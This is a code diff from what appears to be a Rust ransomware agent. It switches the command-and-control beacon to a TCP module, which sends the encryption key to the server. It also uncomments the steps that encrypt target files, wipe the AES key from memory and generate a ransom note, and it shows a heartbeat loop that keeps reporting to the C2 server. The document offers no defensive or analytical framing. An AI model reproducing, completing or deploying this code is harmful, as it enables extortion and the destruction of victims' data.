@@ -14,7 +14,7 @@ use crate::post::{
     commands::{AgentCommand, ResultQueue}
 };
 use crate::crypto::encryption;
-use crate::communication::beacon;
+use crate::communication::beacon_tcp;
 
 
 pub async fn _ransom2(logger: Arc<logger::Logger>, config: &AppConfig) -> Result<(), Box<dyn std::error::Error>> {
@@ -45,7 +45,7 @@ pub async fn _ransom2(logger: Arc<logger::Logger>, config: &AppConfig) -> Result
 
     // Step 4: Send initial beacon to C2
     let result_queue: ResultQueue = Arc::new(Mutex::new(None));
-    let (agent_id, session_id) = beacon::initial_beacon(
+    let (agent_id, session_id) = beacon_tcp::initial_beacon(
         &config.server_address, 
         config.retries, 
         config.timeout_seconds,
@@ -143,7 +143,7 @@ pub async fn ransom(logger: Arc<logger::Logger>, config: &AppConfig) -> Result<(
     
     
     // Step 3: Connect to C2 server and send encryption key
-    let (agent_id, session_id) = beacon::initial_beacon(
+    let (agent_id, session_id) = beacon_tcp::initial_beacon(
         &config.server_address, 
         config.retries, 
         config.timeout_seconds,
@@ -160,24 +160,24 @@ pub async fn ransom(logger: Arc<logger::Logger>, config: &AppConfig) -> Result<(
     }
 
     
-    // // Ask user if wants to continue: only for testing purposes, remove later
-    // if !ask_user_confirmation() {
-    //     logger.log("User chose not to continue. Exiting...");
-    //     return Ok(());
-    // }
+    // Ask user if wants to continue: only for testing purposes, remove later
+    if !ask_user_confirmation() {
+        logger.log("User chose not to continue. Exiting...");
+        return Ok(());
+    }
 
-    // // Step 4: Encrypt files
-    // match encryption::encrypt(targets, &logger, &config.extension, aes_key, aes_iv) {
-    //     Ok(_) => {},
-    //     Err(e) => logger.log(&format!("Error during encryption: {}", e)),
-    // }
+    // Step 4: Encrypt files
+    match encryption::encrypt(targets, &logger, &config.extension, aes_key, aes_iv) {
+        Ok(_) => {},
+        Err(e) => logger.log(&format!("Error during encryption: {}", e)),
+    }
 
-    // // Wipe AES key from memory
-    // aes_key.zeroize();
-    // aes_iv.zeroize();
+    // Wipe AES key from memory
+    aes_key.zeroize();
+    aes_iv.zeroize();
     
-    // // Step 5: Display ransom note  TODO: place on Desktop
-    // let _ = note::generate_note(&logger, &config.note_path);
+    // Step 5: Display ransom note  TODO: place on Desktop
+    let _ = note::generate_note(&logger, &config.note_path);
 
     // Step 6 Run heartbeat loop forever. If no response from server, switch to offline mode until reconnected
     loop {
